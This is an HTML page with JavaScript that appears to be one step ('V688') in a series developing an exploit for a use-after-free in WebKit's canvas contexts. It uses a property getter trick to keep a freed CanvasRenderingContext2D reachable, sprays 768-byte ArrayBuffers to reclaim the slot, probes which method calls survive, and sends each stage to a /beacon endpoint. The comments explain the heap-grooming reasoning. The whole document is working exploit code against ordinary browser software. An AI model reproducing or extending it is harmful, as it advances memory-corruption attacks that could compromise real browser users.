<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>V688 which call survives</title></head>
<body><pre id="out">V688 — with the slot owned by our ArrayBuffer, which call survives?</pre>
<script>
/* V688
 *
 * V687 proved: ArrayBuffer(768) reclaims the freed CanvasRenderingContext2D
 * (size class 768).  So `savedCtx` now points at memory we can read/write
 * from JS through the Uint8Array.  But V686 died on the first call.
 *
 * Every op here: trigger -> spray 16 x ArrayBuffer(768) -> OSPRAY (sync)
 *                 -> [action] -> OSTEP (sync) -> OLATE (async, +2s)
 *
 * ops, each a separate link (a crash kills the page):
 *   idle   : no call at all               -> does an AB-owned slot survive on its own?
 *   path   : savedCtx.beginPath()         -> pure call, no allocation, no state, no canvas
 *   attrs  : savedCtx.getContextAttributes() -> pure struct read BUT allocates a JS object
 *   save   : savedCtx.save()              -> pure counter write in current WebKit,
 *                                            state-stack copy in older WebKit
 *   gc     : allocate ~8MB of garbage     -> forces GC, which runs
 *                                            JSCanvasRenderingContext2DOwner::
 *                                            isReachableFromOpaqueRoots ->
 *                                            wrapped().canvas()  on our zeroed object
 *
 * Reading of the result:
 *   idle crashes            -> background GC alone kills an AB-owned slot
 *   path ok, attrs crashes  -> the killer is allocation/GC, not the call
 *   path crashes            -> the killer is the call path itself
 *   gc crashes              -> confirmed: GC opaque-root hook dereferences m_canvas
 */
'use strict';
var PARAM = {};
try {
  var parts = location.search.replace(/^\?/, '').split('&');
  for (var qi = 0; qi < parts.length; qi++) {
    if (!parts[qi]) continue;
    var kv = parts[qi].split('=');
    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
  }
} catch (e) {}

var MODE = PARAM.op || 'idle';
var NAB  = parseInt(PARAM.n || '16', 10);
var O = document.getElementById('out');
function say(s) { O.textContent += '\n' + s; }

function st() {
  try { if (window.localStorage) return window.localStorage; } catch (e) {}
  try { if (window.sessionStorage) return window.sessionStorage; } catch (e) {}
  return null;
}
var ST = st();
function stGet(k) { try { return ST ? ST.getItem(k) : null; } catch (e) { return null; } }
function stSet(k, v) { try { if (ST) ST.setItem(k, v); } catch (e) {} }

function bk(tag, body) {
  try { new Image().src = '/beacon/V688-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now(); } catch (e) {}
}
function bks(tag, body) {
  var u = '/beacon/V688-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); } catch (e) {}
}

function clearOnce() {
  var n = 0, pref = ['v683c_', 'v684c_', 'v685c_', 'v686c_', 'v687c_', 'v688c_'];
  try {
    var keys = [];
    for (var k = 0; k < ST.length; k++) keys.push(ST.key(k));
    for (var j = 0; j < keys.length; j++) {
      for (var p = 0; p < pref.length; p++) {
        if (keys[j] && keys[j].indexOf(pref[p]) === 0) { ST.removeItem(keys[j]); n++; break; }
      }
    }
  } catch (e) {}
  return n;
}

function hex64(dv, o) {
  var lo = dv.getUint32(o, true) >>> 0, hi = dv.getUint32(o + 4, true) >>> 0;
  var l = lo.toString(16), h = hi.toString(16);
  while (l.length < 8) l = '0' + l;
  while (h.length < 8) h = '0' + h;
  return h + l;
}

if (MODE === 'reset' || PARAM.reset === '1') {
  var cn = clearOnce();
  bks('ORESET', 'cleared=1,once=' + cn);
  say('all guards cleared. Reload the index.');
}

if (MODE !== 'reset') {
  var onceKey = 'v688c_' + MODE;
  var once = PARAM.once === '1';
  var blocked = false;
  if (once) {
    if (stGet(onceKey) === '1') blocked = true;
    else stSet(onceKey, '1');
  }

  if (blocked) {
    bks('OBLOCK', 'op=' + MODE);
    say('BLOCKED by once=1 for op=' + MODE + ' (tap RESET)');
  } else {
    setTimeout(function () { bk('OLATE', 'op=' + MODE + ',alive=1'); }, 2000);

    bks('OBOOT', 'op=' + MODE + ',n=' + NAB + ',once=' + (once ? 1 : 0));

    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    document.body.appendChild(canvas);
    window._v688canvas = canvas;

    var savedCtx = null;
    var dict = {};
    Object.defineProperty(dict, 'alpha', {
      get: function () {
        var ctx = canvas.getContext('2d');
        if (!ctx) return true;
        savedCtx = ctx;
        window._v688ctx = ctx;
        try { ctx.lineWidth = 3.14159; } catch (eI) {}
        return true;
      }
    });

    var bmpCtx = null;
    try { bmpCtx = canvas.getContext('bitmaprenderer', dict); } catch (eJ) {}

    bks('OTRIG', 'op=' + MODE + ',bmp=' + (bmpCtx ? 1 : 0) + ',inner=' + (savedCtx ? 1 : 0));

    if (!savedCtx || !bmpCtx) {
      bks('OFAIL', op_fail(MODE));
      say('ABORT: trigger failed');
    } else {
      var abs = [], vs = [], dvs = [];
      for (var i = 0; i < NAB; i++) {
        var ab = new ArrayBuffer(768);
        abs.push(ab);
        vs.push(new Uint8Array(ab));
        dvs.push(new DataView(ab));
      }
      window._v688keep = { abs: abs, vs: vs };
      bks('OSPRAY', 'op=' + MODE + ',made=' + abs.length);

      var res = '';
      if (MODE === 'idle') {
        res = 'no-call';
      } else if (MODE === 'path') {
        try { savedCtx.beginPath(); res = 'beginPath=ok'; }
        catch (e1) { res = 'E!' + (e1.name || 'err'); }
      } else if (MODE === 'attrs') {
        try {
          var at = savedCtx.getContextAttributes();
          res = 'alpha=' + at.alpha + ',cs=' + at.colorSpace + ',desync=' + at.desynchronized +
                ',wrf=' + at.willReadFrequently;
        } catch (e2) { res = 'E!' + (e2.name || 'err'); }
      } else if (MODE === 'save') {
        try { savedCtx.save(); res = 'save=ok'; }
        catch (e3) { res = 'E!' + (e3.name || 'err'); }
      } else if (MODE === 'gc') {
        var junk = [], k;
        for (k = 0; k < 4000; k++) junk.push('x' + k + '-' + (k * 7919).toString(36));
        for (k = 0; k < 2000; k++) junk.push({ a: k, b: 'y' + k });
        window._v688junk = junk;
        res = 'gc-junk=' + junk.length;
      } else {
        res = 'unknown-op';
      }
      bks('OSTEP', 'op=' + MODE + ',' + res);
      say(MODE + ' -> ' + res);
    }
  }
}

function op_fail(m) { return 'op=' + m + ',trigger'; }
</script>
</body></html>
